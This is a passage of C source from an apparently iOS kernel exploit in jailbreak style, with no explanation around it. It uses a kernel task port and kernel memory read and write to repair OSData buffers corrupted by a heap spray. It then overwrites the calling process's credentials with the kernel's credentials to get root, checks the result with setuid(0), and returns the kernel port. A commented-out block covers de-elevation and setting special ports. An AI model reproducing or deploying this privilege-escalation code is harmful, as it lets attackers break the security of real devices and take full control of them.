    // in here only part of the buffer got freed, we don't know how much so the solution is more complex.
    // we need to check if each page is mapped and if so check if it was allocated by us and not freed and reallocated by the system.
    // when we find a page allocated by us it is safe to assume there won't be more corrupted pages since the corruption is contiguous
    uint64_t kfree_array = address_of_property_key(IOSurfaceRootUserClient, kfree_buffer_key); // OSArray *
    count = OSArray_objectCount(kfree_array);
    
    uint64_t start_of_corruption = segment_list_addr + 96 MB + 96 MB + 8 * pagesize + 8 * pagesize + 8 * pagesize;
    
    for (int i = 0; i < count; i++) {
        uint64_t object = OSArray_objectAtIndex(kfree_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
    
        if (buffer >= start_of_corruption) {
            uint64_t page = 0;
            
            // 8 pages
            for (int p = 0; p < 8; p++) {
                page = buffer + p * pagesize;
                
                // if allocation doesn't work page is mapped, otherwise it's free
                ret = mach_vm_allocate(new_tfp0, &page, pagesize, VM_FLAGS_FIXED); // reallocate at same address
                if (ret) {
                    uint64_t readval = rk64tw(page);
                    if (readval == 0x4242424242424242) {
                        util_info("Fixing corrupted OSData buffer at 0x%llx", buffer);
                        
                        // fix it
                        OSData_setBuffer(object, page);
                        OSData_setLength(object, 8 * pagesize - (uint32_t)(page - buffer));
                        
                        // if we find a non-corrupted buffer stop
                        goto out;
                    }
                    else {
                        util_info("Part of buffer reallocated by the system, keeping");
                    }
                }
                else {
                    kfreetw(page, pagesize); // was freed already, so keep it freed
                }
            }
            
            // if we've reached this point object is corrupted entirely
            OSData_setLength(object, 0);
        }
    }
    

out:;
    IOSurface_remove_property(kfree_buffer_key);
    /* eleveate creds to kernel */

    
    uint64_t orig_ucred = rk64tw(our_procStruct_addr_exported + koffset_TW(KSTRUCT_OFFSET_PROC_UCRED_TW));
    if (orig_ucred == 0x0)
    {
        util_error("failed to get orig_ucred!");
        ret = KERN_FAILURE;
        goto err;
    }
    util_info("orig_ucred: 0x%llx", orig_ucred);
    
    uint64_t kern_ucred = rk64tw(our_kernel_procStruct_exportAstylez + koffset_TW(KSTRUCT_OFFSET_PROC_UCRED_TW));
    if (kern_ucred == 0x0)
    {
        util_error("failed to get kern_ucred!");
        ret = KERN_FAILURE;
        goto err;
    }
    util_info("kern_ucred: 0x%llx", kern_ucred);
    
    wk64tw(our_procStruct_addr_exported + koffset_TW(KSTRUCT_OFFSET_PROC_UCRED_TW), kern_ucred);
    
    util_info("setuid: %d, uid: %d", setuid(0), getuid());
    if (getuid() != 0)
    {
        util_error("failed to elevate to root/kernel creds!");
        ret = KERN_FAILURE;
        goto err;
    }
    
    /*mach_port_t hsp4;
    ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
    
     de-elevate
    
    kwrite64(the_one, ourproc + offsets->struct_offsets.proc_ucred, orig_ucred);
    
    LOG("setuid: %d, uid: %d", setuid(orig_uid), getuid());
    if (getuid() != orig_uid)
    {
        LOG("failed to de-elevate to uid: %d", orig_uid);
        ret = KERN_FAILURE;
        goto out;
    }
    
    uint64_t cr_label = kread64(the_one, orig_ucred + 0x78);
    kwrite64(the_one, cr_label + 0x10, 0);
    
    if (ret != KERN_SUCCESS ||
        !MACH_PORT_VALID(hsp4))
    {
        LOG("failed to set hsp4! error: %x %s, port: %x", ret, mach_error_string(ret), hsp4);
        goto out;
    }
    
    test it */
//    set_tfp0(new_tfp0);
    return new_tfp0;

err:;
    for (int i = 0; i < 200; i++) {
        if (ports[i] && ports[i] != new_tfp0) mach_port_destroy(mach_task_self(), ports[i]);
    }
    
    if (data) free(data);
    term_IOAccelerator();
    term_IOSurface();
    return new_tfp0;
}
